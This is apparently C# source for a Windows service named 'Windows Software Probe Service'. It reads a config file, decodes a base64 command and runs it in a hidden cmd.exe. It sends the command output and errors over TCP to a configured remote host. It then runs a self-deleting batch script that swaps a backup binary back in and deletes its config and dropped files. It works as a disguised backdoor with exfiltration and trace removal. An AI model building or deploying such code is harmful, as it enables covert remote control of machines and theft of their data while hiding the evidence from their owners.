using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.ServiceProcess;
using System.Text;
using System.Threading;

public sealed class AgentService : ServiceBase
{
    public AgentService()
    {
        ServiceName = "Windows Software Probe Service";
        CanStop = true;
    }

    protected override void OnStart(string[] args)
    {
        new Thread(Execute).Start();
    }

    private static void Execute()
    {
        string root = Directory.GetParent(AppDomain.CurrentDomain.BaseDirectory.TrimEnd('\\')).FullName;
        string config = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "service.cfg");
        try
        {
            string[] lines = File.ReadAllLines(config);
            string mode = lines[0];
            string host = lines[1];
            int port = Int32.Parse(lines[2]);
            string command = Encoding.UTF8.GetString(Convert.FromBase64String(lines[3]));
            string script = Path.GetTempFileName() + ".cmd";
            File.WriteAllText(script, command, Encoding.Default);
            var start = new ProcessStartInfo("cmd.exe", "/d /q /c \"" + script + "\"");
            start.UseShellExecute = false;
            start.CreateNoWindow = true;
            if (mode == "command")
            {
                start.RedirectStandardOutput = true;
                start.RedirectStandardError = true;
            }
            using (var process = Process.Start(start))
            {
                if (mode == "command")
                {
                    string output = process.StandardOutput.ReadToEnd() + process.StandardError.ReadToEnd();
                    process.WaitForExit();
                    Send(host, port, output);
                }
                else
                {
                    process.WaitForExit();
                }
            }
            File.Delete(script);
        }
        catch (Exception error)
        {
            try
            {
                string[] lines = File.ReadAllLines(config);
                Send(lines[1], Int32.Parse(lines[2]), error.ToString());
            }
            catch {}
        }
        Restore(root, config);
    }

    private static void Send(string host, int port, string output)
    {
        for (int attempt = 0; attempt < 10; attempt++)
        {
            try
            {
                using (var client = new TcpClient(host, port))
                using (var stream = client.GetStream())
                {
                    byte[] data = Encoding.UTF8.GetBytes(output);
                    stream.Write(data, 0, data.Length);
                }
                return;
            }
            catch
            {
                Thread.Sleep(1000);
            }
        }
    }

    private static void Restore(string root, string config)
    {
        string current = Path.Combine(root, "bin", "wsp.exe");
        string backup = Path.Combine(root, "CodeDrop", "ServiceBackup", "wsp.exe");
        if (!File.Exists(backup)) return;
        string helper = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".cmd");
        string temp = Path.Combine(root, "Temp", "CodeDropTmp");
        string body =
            "@echo off\r\n" +
            "timeout /t 2 /nobreak >nul\r\n" +
            "sc stop \"Windows Software Probe Service\" >nul 2>&1\r\n" +
            "timeout /t 4 /nobreak >nul\r\n" +
            "taskkill /f /im wsp.exe >nul 2>&1\r\n" +
            "copy /y \"" + backup + "\" \"" + current + "\" >nul\r\n" +
            "del /f /q \"" + config + "\" >nul 2>&1\r\n" +
            "del /f /q \"" + Path.Combine(temp, "wsp.exe") + "\" >nul 2>&1\r\n" +
            "del /f /q \"" + Path.Combine(temp, "service.cfg") + "\" >nul 2>&1\r\n" +
            "del /f /q \"" + Path.Combine(temp, "CodeDropMeta.xml") + "\" >nul 2>&1\r\n" +
            "sc start \"Windows Software Probe Service\" >nul 2>&1\r\n" +
            "del /f /q \"%~f0\"\r\n";
        File.WriteAllText(helper, body, Encoding.Default);
        var start = new ProcessStartInfo("cmd.exe", "/d /q /c start \"\" /b \"" + helper + "\"");
        start.UseShellExecute = false;
        start.CreateNoWindow = true;
        Process.Start(start);
    }

    public static void Main()
    {
        ServiceBase.Run(new AgentService());
    }
}